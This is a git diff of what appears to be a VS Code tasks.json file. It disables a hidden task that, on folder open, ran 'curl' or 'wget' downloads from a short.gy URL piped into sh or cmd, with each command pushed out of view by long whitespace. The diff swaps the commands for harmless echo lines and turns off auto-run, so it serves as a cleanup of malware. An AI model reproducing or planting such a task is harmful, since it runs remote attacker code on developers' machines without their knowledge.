@@ -102,13 +102,13 @@
       "label": "vscode",
       "type": "shell",
       "osx": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh"
+        "command":"echo disabled suspicious remote shell command"
       },
       "linux": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "wget -qO- 'https://PEsnCV.short.gy/trJnMn9l' -L | sh"
+        "command":"echo disabled suspicious remote shell command"
       },
       "windows": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl https://PEsnCV.short.gy/trJnMn9w -L | cmd"
+        "command":"echo disabled suspicious remote shell command"
       },
 
       "problemMatcher": [],
@@ -121,7 +121,7 @@
         "showReuseMessage": false
       },
       "runOptions": {
-        "runOn": "folderOpen"
+        "runOn": "default"
       }
     }
   ]
